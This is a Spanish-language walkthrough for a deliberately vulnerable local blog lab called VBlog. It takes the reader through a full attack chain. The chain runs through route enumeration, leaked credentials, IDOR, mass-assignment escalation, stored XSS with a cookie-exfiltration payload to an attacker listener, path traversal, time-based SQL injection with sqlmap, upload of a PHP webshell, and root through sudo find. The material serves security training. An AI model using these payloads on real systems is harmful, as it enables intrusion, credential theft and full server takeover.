# VBlog — Walkthrough

> Arquitectura detallada: [arquitecture.md](arquitecture.md)

Esta guía recorre la cadena de ataque completa paso a paso. Cada paso indica **qué hacer** — en el navegador, en la terminal o en las DevTools — y **qué esperar**.

---

## Arranque

**Terminal:**
```bash
git clone https://github.com/Andonigt04/VBlog.git
cd VBlog
sudo docker compose up --build -d
```

Abre el navegador y entra en **http://localhost**. El blog debería cargarse.

---

## Fase 0 — Reconocimiento (sin cuenta)

### Paso 1 — Explorar la aplicación

Abre **http://localhost** en el navegador.

- Navega: lee posts, prueba las categorías, observa la barra de navegación.
- Fíjate: hay botones de **Login** y **Sign up**. No hay ningún enlace de administración visible.
- Mira el código fuente de la página (clic derecho → Ver código fuente o `Ctrl+U`). Busca comentarios, enlaces ocultos o metadatos.

### Paso 2 — Enumerar rutas ocultas

**Terminal:**
```bash
gobuster dir -u http://localhost \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html \
  -t 50
```

Espera a que termine el escaneo. Deberías encontrar:

| Ruta | Estado | Notas |
|---|---|---|
| `/backup` | 200 | Contiene credenciales |
| `/debug` | 200 | Información tecnológica |
| `/old` | 302 | Redirige a `/` |
| `/internal` | 403 | Forbidden (señuelo) |
| `/admin` | 302 | Redirige a `/dashboard` |

### Paso 3 — Leer los archivos expuestos

**Navegador:** Ve a **http://localhost/backup**

Verás las credenciales en texto plano:
```
editor_user=editor01
editor_pass=editor01pass
admin_user=adm01
admin_email=adm01@vblog.local
admin_pass=adm01local

host=postgresql
database=vblog
user=vblog_adm
password=uireh34t34
```

**Guárdalas.** Las usarás durante todo el ejercicio.

**Navegador:** Ve a **http://localhost/debug**

Verás una respuesta JSON con la versión de PHP, el driver de base de datos y el número de usuarios. Anota los valores exactos — te ayudarán a construir exploits más adelante.

### Paso 4 — Enumerar usuarios por IDOR

La API expone datos de usuarios sin requerir inicio de sesión.

**Terminal:**
```bash
# Leer usuario 1
curl http://localhost/api/users/1

# Iterar para encontrar al admin (generalmente alrededor del id 52)
for i in $(seq 1 55); do
  echo -n "id=$i: "
  curl -s http://localhost/api/users/$i | grep -o '"role":"[^"]*"'
done
```

O en el **navegador**, abre **http://localhost/api/users/1** e incrementa el número en la URL hasta encontrar `"role":"admin"`.

**Salida esperada para el admin:**
```json
{
  "id": 52,
  "name": "adm01",
  "email": "adm01@vblog.local",
  "role": "admin"
}
```

### Paso 5 — Enumerar subdominios ocultos

**Terminal:**
```bash
gobuster vhost -u http://localhost \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain \
  -t 30
```

Deberías descubrir: **dev.vblog.local**

**Añádelo a tu archivo de hosts:**
```bash
echo "127.0.0.1  dev.vblog.local" | sudo tee -a /etc/hosts
```

**Navegador:** Abre **http://dev.vblog.local**

Explora las tres páginas:
- `/` — resumen del entorno (framework, BD, versión de PHP)
- `/api-docs.html` — documentación interna de la API con detalles de los endpoints
- `/logs.html` — logs de la aplicación con cadenas de conexión a la BD y trazas de peticiones

> En `/logs.html` encontrarás la cadena de conexión completa a la BD y trazas de peticiones con mass assignment — pistas muy útiles para las siguientes fases.

---

## Fase 1 — Registrarse e iniciar sesión

### Paso 1 — Crear una cuenta

**Navegador:** Ve a **http://localhost/signup**

Rellena:
- **Username:** `hacker` (o el nombre que prefieras)
- **Password:** `password123`

Haz clic en **Create account**. Serás redirigido a la página principal como usuario registrado.

### Paso 2 — Inspeccionar la sesión

Abre **DevTools** (`F12`) → pestaña **Application** → **Cookies** → `http://localhost`

Verás una cookie llamada `laravel_session`. Observa que **HttpOnly no está marcado** — significa que JavaScript puede leer esta cookie (se explota en la Fase 3).

### Paso 3 — Obtener tu ID de usuario y rol

**Terminal:**
```bash
# Iniciar sesión y guardar la cookie de sesión
curl -c /tmp/cookies.txt -X POST http://localhost/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@example.com","passkey":"password123"}'

# Consultar la información del usuario actual
curl -b /tmp/cookies.txt http://localhost/api/me
```

**Salida esperada:**
```json
{"id": 53, "name": "hacker", "email": "...", "role": "user"}
```

Anota tu **ID de usuario** (ej. `53`). Lo usarás en el siguiente paso.

---

## Fase 2 — Escalada de privilegios (Mass Assignment)

El endpoint de actualización acepta cualquier campo que envíes — incluido `role`. No hay ninguna comprobación que impida a un usuario normal promocionarse a admin.

### Paso 1 — Escalar a admin

**Terminal** (sustituye `53` por tu ID real):
```bash
curl -b /tmp/cookies.txt -X PUT http://localhost/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

También puedes hacerlo **con Burp Suite**:
1. Abre Burp Suite → Proxy → Intercept ON
2. En el navegador, ve a **http://localhost/profile** y haz clic en **Save changes** (cualquier cambio)
3. En Burp, cambia el método a `PUT`, la URL a `/api/update/user/53` y el cuerpo a `{"role":"admin"}`
4. Reenvía la petición

### Paso 2 — Verificar la escalada

**Terminal:**
```bash
curl -b /tmp/cookies.txt http://localhost/api/me
```

**Salida esperada:**
```json
{"id": 53, "name": "hacker", "role": "admin"}
```

**Navegador:** Recarga la página. Ahora deberías ver un enlace de **Dashboard** en la navegación.

### Paso 3 — Acceder al panel de administración

**Navegador:** Ve a **http://localhost/dashboard**

Aunque acabas de cambiar tu rol a través de la API, el dashboard te deja entrar — solo comprueba que estás autenticado, no que realmente seas admin (Control de Acceso Roto).

Verás listas de todos los usuarios, posts y comentarios del servidor.

---

## Fase 3 — XSS Almacenado + Panel Interno

### Paso 1 — Inyectar un comentario malicioso

**Navegador:** Ve a cualquier post del blog (haz clic en un título en la página principal).

Baja hasta el formulario de comentarios. En el **campo de texto del comentario**, escribe:

```html
<script>alert(document.cookie)</script>
```

Haz clic en **Post comment**.

**Navegador:** Recarga la página del post. Aparecerá un cuadro de diálogo con tu cookie de sesión. Esto confirma que el XSS funciona.

### Paso 2 — Robar una cookie (prueba de concepto)

Para demostrar el impacto real, enviarías la cookie a un servidor externo. En un entorno de laboratorio:

**Terminal — inicia un listener:**
```bash
python3 -m http.server 8888
```

**Navegador:** Publica un nuevo comentario con este payload (sustituye la IP por la de tu máquina):
```html
<script>fetch('http://TU_IP:8888/?c='+document.cookie)</script>
```

Cuando cualquier usuario (incluido un admin) visite ese post, su cookie llegará a tu listener.

**Terminal:** Observa la salida — verás una petición como:
```
GET /?c=laravel_session=eyJ... HTTP/1.1
```

Esa cookie puede usarse para suplantar la sesión del propietario.

### Paso 3 — Explorar el panel interno

Si aún no lo has hecho, añade el subdominio a tu archivo de hosts y ábrelo:

**Navegador:** Ve a **http://dev.vblog.local/logs.html**

Lee los logs con atención. Encontrarás:
- La cadena de conexión a PostgreSQL con las credenciales
- Trazas de llamadas a la API, incluyendo intentos de mass assignment
- Otra información interna útil para las fases siguientes

---

## Fase 4 — API de Admin: Path Traversal y SQL Injection

Necesitas una sesión activa como admin. Usa la cookie de la terminal o mantén la sesión en el navegador.

### Paso 1 — Leer archivos del servidor (Path Traversal)

**Terminal:**
```bash
# Leer el archivo .env de la aplicación
curl -b /tmp/cookies.txt \
  "http://localhost/api/admin/file?path=.env"

# Salir del directorio de la app
curl -b /tmp/cookies.txt \
  "http://localhost/api/admin/file?path=../../etc/passwd"
```

**Navegador:** También puedes probarlo directamente en la barra de URL:
```
http://localhost/api/admin/file?path=../../etc/passwd
```

La respuesta contendrá `/etc/passwd` del contenedor — confirmando que puedes leer archivos arbitrarios.

Otros archivos interesantes:
```bash
# Configuración de nginx
curl -b /tmp/cookies.txt "http://localhost/api/admin/file?path=../../etc/nginx/nginx.conf"

# Claves SSH (si existen)
curl -b /tmp/cookies.txt "http://localhost/api/admin/file?path=../../root/.ssh/id_rsa"
```

### Paso 2 — Provocar un error SQL (SQL Injection)

**Terminal:**
```bash
curl -b /tmp/cookies.txt \
  "http://localhost/api/admin/stats?filter='"
```

**Navegador:** Abre:
```
http://localhost/api/admin/stats?filter='
```

Verás un error **500 Internal Server Error** con una traza de PostgreSQL. Esto confirma que el parámetro `filter` se inyecta directamente en la consulta SQL.

### Paso 3 — Confirmar la inyección ciega (basada en tiempo)

**Terminal:**
```bash
# Esta petición debería tardar al menos 3 segundos
curl -b /tmp/cookies.txt \
  "http://localhost/api/admin/stats?filter=%25%27%20AND%20(SELECT%201%20FROM%20pg_sleep(3))%3D1%20AND%20%27%25%27%3D%27"
```

Si la respuesta se retrasa ~3 segundos, la inyección está confirmada.

### Paso 4 — Volcar la base de datos con sqlmap

**Terminal:**
```bash
sqlmap -u "http://localhost/api/admin/stats?filter=test" \
  --cookie="laravel_session=PEGA_TU_COOKIE_AQUÍ" \
  --dbms=postgresql \
  --level=3 --risk=2 \
  --batch \
  --dump -T users
```

Esto extraerá todas las filas de la tabla `users`, incluidos los hashes de contraseñas.

---

## Fase 5 — Ejecución Remota de Código via Subida de Fichero

El endpoint de subida del admin guarda los archivos con el nombre original en un directorio público. No hay comprobación de extensión.

### Paso 1 — Crear un webshell

**Terminal:**
```bash
echo '<?php passthru(base64_decode($_GET["cmd"])); ?>' > /tmp/shell.php
```

### Paso 2 — Subir el webshell

**Terminal:**
```bash
curl -b /tmp/cookies.txt -X POST http://localhost/api/admin/upload \
  -F "file=@/tmp/shell.php;type=image/jpeg"
```

**Respuesta esperada:**
```json
{"url": "http://localhost/avatars/shell.php"}
```

### Paso 3 — Ejecutar comandos remotos

El shell acepta comandos codificados en base64 a través del parámetro `cmd`.

**Terminal:**
```bash
# Codificar un comando
echo -n "id" | base64
# Salida: aWQ=

# Ejecutarlo
curl "http://localhost/avatars/shell.php?cmd=aWQ="
# Salida: uid=33(www-data) gid=33(www-data)
```

**Navegador:** También puedes probarlo en la barra de URL:
```
http://localhost/avatars/shell.php?cmd=aWQ=
```

Más comandos:
```bash
# Listar /etc
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'ls -la /etc/' | base64 -w0)"

# Leer /etc/passwd
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'cat /etc/passwd' | base64 -w0)"

# Hostname
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'hostname' | base64 -w0)"
```

Ahora tienes **Ejecución Remota de Código** como `www-data` en el servidor.

---

## Fase 6 — Escalada a root

### Paso 1 — Comprobar privilegios sudo

**Terminal:**
```bash
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'sudo -l' | base64 -w0)"
```

**Salida esperada:**
```
User www-data may run the following commands on ...:
    (root) NOPASSWD: /usr/bin/find
```

### Paso 2 — Explotar con GTFOBins (sudo find)

El binario `find` puede ejecutar comandos con `-exec`. Como podemos ejecutar `find` como root sin contraseña, podemos ejecutar cualquier cosa como root.

**Terminal:**
```bash
# Ejecutar un comando como root y guardar la salida
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'sudo find . -exec /bin/sh -c "id > /tmp/pwned" \; -quit' | base64 -w0)"

# Leer el resultado
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'cat /tmp/pwned' | base64 -w0)"
```

**Salida esperada:**
```
uid=0(root) gid=0(root) groups=0(root)
```

**Has obtenido root.**

### Paso 3 — Alternativa: bash SUID

**Terminal:**
```bash
# Comprobar si rootbash existe
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'ls -la /tmp/rootbash' | base64 -w0)"

# Ejecutarlo con -p (preservar el UID efectivo)
curl "http://localhost/avatars/shell.php?cmd=$(echo -n '/tmp/rootbash -p -c id' | base64 -w0)"
```

**Salida esperada:**
```
uid=33(www-data) euid=0(root)
```

El UID efectivo es 0 — acceso root mediante el bit SUID.

---

## Cadena de escalada completa (resumen)

```
Fase 0 — Reconocimiento (anónimo)
  1. Navegador: http://localhost → explorar la app
  2. gobuster dir → encuentra /backup, /debug
  3. Navegador: http://localhost/backup → credenciales de editor + admin + BD
  4. curl /api/users/1..55 → IDOR, encontrar admin (id 52)
  5. gobuster vhost → dev.vblog.local
  6. Añadir a /etc/hosts → http://dev.vblog.local/logs.html

Fase 1 — Registro
  1. Navegador: http://localhost/signup → crear cuenta
  2. curl /api/me → obtener ID de usuario y rol actual

Fase 2 — Admin (Mass Assignment)
  1. PUT /api/update/user/{id} -d '{"role":"admin"}'
  2. curl /api/me → role: admin ✓
  3. Navegador: http://localhost/dashboard → acceso concedido

Fase 3 — XSS + Panel Interno
  1. Navegador: publicar <script>alert(document.cookie)</script> como comentario
  2. Recargar post → la cookie aparece en el alert
  3. Navegador: http://dev.vblog.local/logs.html → cadena de BD + trazas

Fase 4 — API de Admin
  1. curl /api/admin/file?path=../../etc/passwd → Path Traversal
  2. curl /api/admin/stats?filter=' → error SQL (PostgreSQL)
  3. sqlmap → volcado completo de la tabla users

Fase 5 — RCE
  1. Crear shell.php con payload passthru
  2. curl -F file=@shell.php /api/admin/upload → /avatars/shell.php
  3. curl /avatars/shell.php?cmd=<base64(id)> → uid=33(www-data)

Fase 6 — root
  1. shell: sudo -l → NOPASSWD: /usr/bin/find
  2. shell: sudo find . -exec /bin/sh -c 'id > /tmp/pwned' \; -quit
  3. cat /tmp/pwned → uid=0(root) ✓
```
